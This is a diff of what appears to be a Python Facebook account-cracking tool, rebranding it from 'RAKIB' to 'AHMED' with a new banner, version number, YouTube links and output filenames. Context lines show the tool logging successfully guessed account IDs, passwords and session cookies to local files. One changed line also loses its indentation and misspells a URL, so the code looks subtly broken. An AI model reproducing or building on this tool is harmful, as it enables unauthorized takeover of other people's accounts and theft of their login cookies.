@@ -246,11 +246,11 @@ $$ |  $$ |$$ |  $$ |$$ | \_/ $$ |$$$$$$$$\ $$$$$$$  |
   
     ┌━━━━━━━━━━━━━━━━━ AhMeD ━━━━━━━━━━━━━━━━━━┑
                \033[1;97mCREATED BY   :  AHMED_SHAR            
-               \033[1;91mFACEBOK         :  Prince King  hu yawr  
-               \033[1;97mGITHUB            :  TVAHMED
-               \033[1;91mSTATUS            :   PATA NHI H YAR😴            
-               \033[1;97mTEAM                :  INSHALLAH  KHABI BANAO GA            
-               \033[1;91mTOOL VIRSION :  1.0                 
+               \033[1;91mFACEBOK      :  Prince King  hu yawr  
+               \033[1;97mGITHUB       :  TVAHMED
+               \033[1;91mSTATUS       :   PATA NHI H YAR😴            
+               \033[1;97mTEAM         :  INSHALLAH  KHABI BANAO GA            
+               \033[1;91mTOOL VIRSION  :  1.2                 
                \033[1;97mTOOL WORK    :  ONLY  DATA  _WIFI KA PTA NHI         
       └━━━━━━━━━━━━━━━━━ H4CKER ━━━━━━━━━━━━━━━━━┘
 """)
@@ -304,13 +304,13 @@ def menu1():
 	print ("\033[1;97m     [3]\033[1;33m MY YOUTUBE CHANEL")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
+		os.system('xdg-open https://www.youtube.com/@AHMEDSHARVLOGS1')
 		crack_file()
 	if ot == '2':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
+		os.system('xdg-open https://www.youtube.com/@AHMEDSHARVLOGS1')
 		rndm()
 	if ot == '3':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
+	os.system('xdg-open https://www.youtube.com/@AHMEDSHARVLOGA1')
 
 	else:
 		menu()
@@ -420,10 +420,10 @@ def c(uid,pwx,ln):
             #	botok(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[65:80]
-            	print('\033[1;92mRAKIB-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
+            	print('\033[1;92mAHMED-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
             	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('RAKIB-OK.txt', 'a').write( cid+' | '+ps+'\n')
-            	open('RAKIB-coki.txt', 'a').write(coki+'\n')
+            	open('AHMED-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('AHMED-coki.txt', 'a').write(coki+'\n')
             	cek_apk(session,coki)
             	oks.append(cid)
             	break
